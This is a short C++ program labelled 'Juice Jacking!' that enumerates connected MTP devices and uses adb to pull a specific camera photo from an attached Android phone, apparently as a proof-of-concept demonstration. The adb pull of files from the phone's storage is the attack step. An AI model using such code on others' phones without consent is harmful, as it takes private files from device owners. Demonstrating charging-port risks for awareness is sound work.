#include <Windows.h>
#include <iostream>
#include <PortableDeviceApi.h>
#include <PortableDeviceTypes.h>
#pragma comment(lib, "PortableDeviceGUIDs.lib")

void ExecuteADBCommand(const std::string& command) {
	std::string adbCommand = "C:\\Android\\platform-tools\\adb " + command;
	int result = std::system(adbCommand.c_str());
	if (result == 0) {
		std::cout << "Command executed successfully.\n";
	}
	else {
		std::cout << "Error executing command.\n";
	}
}

void ListMTPDevices() {
    CoInitialize(NULL);

    IPortableDeviceManager* deviceManager = NULL;
    HRESULT hr = CoCreateInstance(CLSID_PortableDeviceManager, NULL, CLSCTX_INPROC_SERVER, IID_PPV_ARGS(&deviceManager));
    if (FAILED(hr)) {
        printf("Failed to create device manager.\n");
        return;
    }

    DWORD deviceCount = 0;
    deviceManager->GetDevices(NULL, &deviceCount);

    if (deviceCount == 0) {
        printf("No MTP devices found.\n");
        deviceManager->Release();
        return;
    }

    PWSTR* deviceIDs = new PWSTR[deviceCount];
    deviceManager->GetDevices(deviceIDs, &deviceCount);

    for (DWORD i = 0; i < deviceCount; i++) {
        // Fetch device friendly name
        WCHAR friendlyName[256];
        DWORD nameSize = sizeof(friendlyName) / sizeof(friendlyName[0]);
        deviceManager->GetDeviceFriendlyName(deviceIDs[i], friendlyName, &nameSize);
        wprintf(L"Device %d: %s\n", i + 1, friendlyName);

        // Fetch manufacturer
        WCHAR manufacturer[256];
        DWORD manufacturerSize = sizeof(manufacturer) / sizeof(manufacturer[0]);
        deviceManager->GetDeviceManufacturer(deviceIDs[i], manufacturer, &manufacturerSize);
        wprintf(L"  Manufacturer: %s\n", manufacturer);

        // Free the device ID
        CoTaskMemFree(deviceIDs[i]);
    }

    delete[] deviceIDs;
    deviceManager->Release();
    CoUninitialize();
}

int main() {
	std::cout << "Juice Jacking!" << std::endl;

	ListMTPDevices(); //lists all connected devices.

	ExecuteADBCommand("devices"); // Lists connected devices
	ExecuteADBCommand("pull /sdcard/DCIM/Camera/IMG_20241202_232610.jpg ./IMG_20241202_232610.jpg"); // Pulls a file
	system("start ./IMG_20241202_232610.jpg");

	return 0;
}